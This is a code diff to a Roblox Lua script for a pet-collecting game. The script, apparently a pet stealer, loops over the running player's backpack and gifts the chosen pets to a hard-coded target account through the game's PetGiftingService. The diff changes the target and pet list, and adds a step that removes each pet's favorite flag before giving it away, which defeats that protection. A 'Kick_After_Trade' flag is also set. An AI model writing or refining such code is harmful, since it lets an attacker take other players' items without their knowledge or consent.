@@ -1,6 +1,6 @@
-getgenv().Target = "matrix4QFeycYL0pz"
+getgenv().Target = "cyberoJH6rXOliaD4"
 getgenv().Select_Pet = {
-    "Corrupted Kitsune",
+    "Racoon",
     "Kitsune"
 }
 getgenv().Kick_After_Trade = true
@@ -58,10 +58,15 @@ else
     end
     while task.wait() do
         for i, v in pairs(save) do
-            if plr:FindFirstChild("Backpack"):FindFirstChild(v.Name) then
+            local petTool = plr:FindFirstChild("Backpack"):FindFirstChild(v.Name)
+            if petTool then
+                if petTool:GetAttribute("Favorite") then
+                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(petTool)
+                    task.wait(1) 
+                end
                 local huy = game:GetService("Players"):FindFirstChild(getgenv().Target)
                 if huy then
-                    plr.Character.Humanoid:EquipTool(v)
+                    plr.Character.Humanoid:EquipTool(petTool)
                     game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", huy)
                     task.wait(5)
                 end
